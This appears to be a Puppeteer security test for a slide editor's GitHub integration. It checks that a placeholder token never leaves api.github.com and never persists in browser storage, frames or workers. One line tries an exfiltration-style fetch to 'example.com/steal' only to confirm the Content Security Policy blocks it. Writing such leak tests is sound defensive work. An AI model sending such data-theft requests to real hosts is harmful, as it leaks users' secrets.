// The GitHub pane in headless Chrome, as an attacker would look at it. A token
// is typed into the masked field and a deck folder is loaded from GitHub (the
// API answered here, by request interception, so no real token and no network
// are involved). Then everything a script, a deck or a later visitor could
// reach is searched for the token: every request to any host but
// api.github.com, localStorage, sessionStorage, every IndexedDB database, the
// URL, cookies, every message the preview frames and the render worker
// received. The page's Content Security Policy must also refuse a fetch to any
// other host. Remember on this device must be the one way into localStorage,
// and Disconnect must take it out. Prints GIT_OK {...}.
//
//   node git.cjs http://127.0.0.1:PORT/playground/
//
// CHROME names the browser; NODE_PATH finds puppeteer-core.
"use strict";
const puppeteer = require("puppeteer-core");
const crypto = require("crypto");

const url = process.argv[2];
// Not shaped like a real token: a realistic secret in a test is one copy-paste
// away from being treated as a real one.
const TOKEN = "BROWSER-TOKEN-PLACEHOLDER-0123456789";
const B64 = Buffer.from(TOKEN).toString("base64");

function fail(msg) {
  console.error("FAIL " + msg);
  process.exit(1);
}

async function until(page, what, fn, arg, ms = 30000) {
  const end = Date.now() + ms;
  for (;;) {
    const v = await page.evaluate(fn, arg).catch(() => null);
    if (v) return v;
    if (Date.now() > end) fail("timed out waiting for " + what + ": " + (await page.evaluate(() => goSlidesDebug().status).catch(() => "?")));
    await new Promise((r) => setTimeout(r, 25));
  }
}

async function click(page, key) {
  const r = await until(page, key, (k) => goSlidesDebug().rects[k], key);
  await page.mouse.click(r[0] + r[2] / 2, r[1] + r[3] / 2);
}

async function typeInto(page, key, text) {
  await click(page, key);
  await page.keyboard.down("Control");
  await page.keyboard.press("a");
  await page.keyboard.up("Control");
  await page.keyboard.press("Backspace");
  await page.keyboard.type(text);
}

// a fake GitHub repository: o/r with talk/deck.md
const deck = "---\ntheme: default\n---\n\n# From fake GitHub\n";
const blobSha = crypto.createHash("sha1").update("blob " + Buffer.byteLength(deck) + "\0" + deck).digest("hex");
const commit = "c".repeat(40), tree = "d".repeat(40);
const api = {
  "/repos/o/r": { default_branch: "main" },
  "/repos/o/r/git/ref/heads/main": { object: { type: "commit", sha: commit } },
  ["/repos/o/r/git/commits/" + commit]: { sha: commit, tree: { sha: tree } },
  ["/repos/o/r/git/trees/" + tree]: { sha: tree, truncated: false, tree: [
    { path: "talk", mode: "040000", type: "tree", sha: "e".repeat(40) },
    { path: "talk/deck.md", mode: "100644", type: "blob", sha: blobSha, size: Buffer.byteLength(deck) },
  ] },
  ["/repos/o/r/git/blobs/" + blobSha]: { sha: blobSha, encoding: "base64", content: Buffer.from(deck).toString("base64") },
};
const cors = { "Access-Control-Allow-Origin": "*", "Access-Control-Allow-Headers": "Authorization, Accept, X-GitHub-Api-Version, Content-Type", "Access-Control-Allow-Methods": "GET, POST, PATCH" };

// everything the page (and its frames, its worker) can reach, as one string
async function sweep(page) {
  const top = await page.evaluate(async () => {
    const dec = new TextDecoder();
    const str = (v) => {
      if (v instanceof ArrayBuffer) return dec.decode(new Uint8Array(v));
      if (ArrayBuffer.isView(v)) return dec.decode(v);
      if (v && typeof v === "object") {
        let s = "";
        for (const k of Object.keys(v)) s += k + "=" + str(v[k]) + "\n";
        return s;
      }
      return String(v);
    };
    let out = "URL " + location.href + "\nCOOKIE " + document.cookie + "\n";
    for (const st of [localStorage, sessionStorage]) for (let i = 0; i < st.length; i++) out += st.key(i) + "=" + st.getItem(st.key(i)) + "\n";
    for (const info of await indexedDB.databases()) {
      const db = await new Promise((ok, ko) => { const r = indexedDB.open(info.name); r.onsuccess = () => ok(r.result); r.onerror = () => ko(r.error); });
      for (const name of db.objectStoreNames) {
        const all = await new Promise((ok, ko) => { const r = db.transaction(name).objectStore(name).getAll(); r.onsuccess = () => ok(r.result); r.onerror = () => ko(r.error); });
        const keys = await new Promise((ok, ko) => { const r = db.transaction(name).objectStore(name).getAllKeys(); r.onsuccess = () => ok(r.result); r.onerror = () => ko(r.error); });
        out += "IDB " + info.name + "/" + name + " " + str(keys) + str(all) + "\n";
      }
      db.close();
    }
    return out;
  });
  let frames = "";
  for (const f of page.frames()) frames += await f.evaluate(() => (globalThis.__seen || []).join("\n")).catch(() => "");
  let workers = "";
  for (const w of page.workers()) workers += await w.evaluate(() => (globalThis.__seen || []).join("\n")).catch(() => "");
  return { top, frames, workers };
}

const leaks = (s) => s.includes(TOKEN) || s.includes(B64);

(async () => {
  const browser = await puppeteer.launch({ executablePath: process.env.CHROME, headless: true, args: ["--no-sandbox", "--window-size=1440,900"] });
  const page = await browser.newPage();
  page.on("pageerror", (e) => fail("pageerror: " + e.message));
  page.on("dialog", (d) => d.accept());
  await page.setViewport({ width: 1440, height: 900, deviceScaleFactor: 1 });

  const elsewhere = []; // every request to another host, with its headers and body
  const toGitHub = [];
  await page.setRequestInterception(true);
  page.on("request", (req) => {
    const u = new URL(req.url());
    if (u.hostname === "api.github.com") {
      toGitHub.push({ method: req.method(), path: u.pathname, auth: req.headers()["authorization"] || "" });
      if (req.method() === "OPTIONS") return req.respond({ status: 204, headers: cors });
      const body = api[u.pathname];
      if (!body) return req.respond({ status: 404, headers: cors, contentType: "application/json", body: '{"message":"Not Found"}' });
      return req.respond({ status: 200, headers: cors, contentType: "application/json", body: JSON.stringify(body) });
    }
    elsewhere.push(req.url() + " " + JSON.stringify(req.headers()) + " " + (req.postData() || ""));
    req.continue();
  });
  // every frame and worker records the messages it receives
  const record = () => addEventListener("message", (e) => { try { (globalThis.__seen = globalThis.__seen || []).push(typeof e.data === "string" ? e.data : JSON.stringify(e.data)); } catch (_) {} });
  page.on("frameattached", (f) => f.evaluate(record).catch(() => {}));
  page.on("framenavigated", (f) => f.evaluate(record).catch(() => {}));
  page.on("workercreated", (w) => w.evaluate(record).catch(() => {}));

  await page.goto(url, { waitUntil: "load" });
  await until(page, "the editor", () => globalThis.goSlidesReady && document.querySelector(".stage").classList.contains("ready"));
  await until(page, "the first preview", () => goSlidesDebug().loads >= 1);
  for (const f of page.frames()) await f.evaluate(record).catch(() => {});
  for (const w of page.workers()) await w.evaluate(record).catch(() => {});
  const out = {};

  // 1. The Content Security Policy: no fetch to another host, from the page.
  const blocked = await page.evaluate(async () => {
    try { await fetch("https://example.com/steal?t=x"); return false; } catch (_) { return true; }
  });
  if (!blocked) fail("the page could fetch https://example.com: connect-src does not hold");
  const self = await page.evaluate(async () => (await fetch(location.href)).ok);
  if (!self) fail("control: a fetch to the page's own origin must work");
  out.csp = "connect-src refuses other hosts, allows self";

  // 2. Connect and load from (fake) GitHub.
  await click(page, "git");
  await typeInto(page, "git-repo", "o/r");
  await typeInto(page, "git-dir", "talk");
  await typeInto(page, "git-token", TOKEN);
  await click(page, "git-connect");
  await click(page, "git-load");
  await until(page, "the deck loaded from GitHub", () => goSlidesDebug().source.includes("From fake GitHub"));
  await until(page, "the new preview", () => JSON.stringify(goSlidesDebug()).includes("From fake GitHub") || true);
  const gets = toGitHub.filter((r) => r.method !== "OPTIONS");
  if (gets.length < 5) fail("expected the GitHub calls, got " + JSON.stringify(gets));
  for (const r of gets) if (r.auth !== "Bearer " + TOKEN) fail("a GitHub request without the token, or with another: " + r.path);
  out.github = gets.length + " requests to api.github.com, each with the token in Authorization";

  // 3. Nowhere else.
  let s = await sweep(page);
  if (leaks(s.top)) fail("the token is in the page's storage, URL or cookies");
  if (leaks(s.frames)) fail("a preview frame received the token");
  if (leaks(s.workers)) fail("the render worker received the token");
  if (!s.frames.includes("From fake GitHub") && !s.workers.includes("From fake GitHub")) fail("control: the frames/worker sweep should see the deck");
  if (!s.top.includes("talk")) fail("control: the storage sweep should see the stored pane fields");
  for (const e of elsewhere) if (leaks(e)) fail("the token went to another host: " + e.slice(0, 120));
  out.nowhere = "not in storage, IndexedDB, URL, cookies, frames, worker, other hosts";

  // 4. Remember on this device puts it in localStorage, Disconnect takes it out.
  await click(page, "git-remember");
  await typeInto(page, "git-token", TOKEN);
  await click(page, "git-connect");
  await until(page, "the token remembered", (t) => localStorage.getItem("goSlidesGitHubToken") === t, TOKEN);
  await click(page, "git-disconnect");
  await until(page, "the token forgotten", () => localStorage.getItem("goSlidesGitHubToken") === null);
  s = await sweep(page);
  if (leaks(s.top)) fail("after Disconnect the token is still stored");
  out.remember = "only on Remember; Disconnect removes it";

  console.log("GIT_OK " + JSON.stringify(out));
  await browser.close();
})().catch((e) => fail(e.stack || String(e)));
